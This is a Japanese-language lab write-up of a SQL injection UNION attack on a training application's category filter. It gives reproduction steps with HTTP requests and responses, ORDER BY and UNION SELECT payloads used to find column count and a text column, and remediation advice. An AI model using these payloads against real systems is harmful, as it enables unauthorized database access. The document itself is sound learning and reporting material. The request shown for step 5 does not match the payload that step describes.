# Lab: SQL injection UNION attack, finding a column containing text
## 概要
対象アプリケーションのcategoryパラメータに対して、ユーザ入力がSQL文にそのまま文字連結されていることを確認しました。  
ユーザ入力の値に対するエスケープ処理やパラメータバインドをしていないため、攻撃者はアプリケーションの想定しないSQLを実行できます。  
本検証では' UNION SELECT NULL,NULL,NULL--を用いて カラム数が3であることを確認し、  
' UNION SELECT NULL,'y9LdLy',NULL-- を用いて文字列を受け取れるカラムが存在することを確認しました。
この問題は認証回避や情報漏洩、データベース構造の漏洩につながる重大なリスクを抱えています。   

## 対象エンドポイント
GET /filter?category=

## 脆弱性の原因
GET /filter?category= の category パラメータが SQL の WHERE 句に
動的に連結されているため、攻撃ポイントとなります。

## 影響度
本脆弱性を悪用されると、以下の影響が発生する可能性があります。

・任意のSQL実行  
・データの全件取得  
・認証回避（ログイン機能がある場合）  
・データ改ざん  
・管理者権限の奪取  

## 再現手順
1 対象URLへアクセス  
https://〜/filter?category=  
2 category パラメータが SQL の WHERE 句に使用されていると推測  
3 ' を入力し、500エラーが発生することを確認  
 → SQL 文が壊れていることを示す  
4 ' order by 1 -- 数を順番に上げていき、カラム数が3であることを推測
5 ' union select NULL,NULL,NULL -- で3カラムであると確認
<details>
<summary>3 HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' HTTP/2
  
レスポンス
HTTP/2 500 Internal Server Error

</details>

 
<details>
<summary>4 HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=Gifts' order by 1 -- HTTP/2
  
レスポンス
HTTP/2 200 OK

リクエスト
GET /filter?category=Gifts' order by 2 -- HTTP/2
  
レスポンス
HTTP/2 200 OK

リクエスト
GET /filter?category=Gifts' order by 3 -- HTTP/2
  
レスポンス
HTTP/2 200 OK

リクエスト
GET /filter?category=Gifts' order by 4 -- HTTP/2
  
レスポンス
HTTP/2 500 Internal Server Error

以上からカラム数は3であると推測できる

</details>
  
5 指定されたランダム値である'y9LdLy'をNULLに順に当てはめていき、  
' union select NULL,'y9LdLy',NULL -- で2カラム目が文字列を受け取れることを確認

<details>
<summary>5 HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' OR 1=2 -- HTTP/2
  
レスポンス
<h1>&apos; OR 1=2 --</h1>
<section class="container-list-tiles">
</section>
   
</details>

## 追加調査
本脆弱性がUNION-based SQL Injectionに発展するか確認するため、
UNION SELECTを用いた列数調査を実施しました。
結果、アプリケーションのクエリは3列であることを確認しました。  
これにより、攻撃者はデータベースに任意の SELECT 文を混在させることが可能なため、　
データベース内の情報（例：ユーザー情報、テーブル一覧、カラム一覧など）を取得できる状態であることが判明しました。　
→ 本脆弱性は情報漏洩・認証回避・データ改ざんに発展しうる重大なリスクがあります。


## 対策
プリペアドステートメントを使用し、ユーザ入力が文字連結しないようにしてください。
パラメータバインドを使用し、入力値をSQL文にを安全に渡すようしてください。
入力値のバリデーションを実施し、想定外の文字列（例：記号、制御文字、過度に長い文字列）を受け付けないようにしてください。
エラーメッセージを制御して、内部情報を表示しないようにしてください。


## 学習メモ（学んだこと）
・UNION を成功させるには、アプリケーション側の SELECT 文と同じ列数に合わせる必要があり、その列数を外部から調査する工程が重要であると理解した。

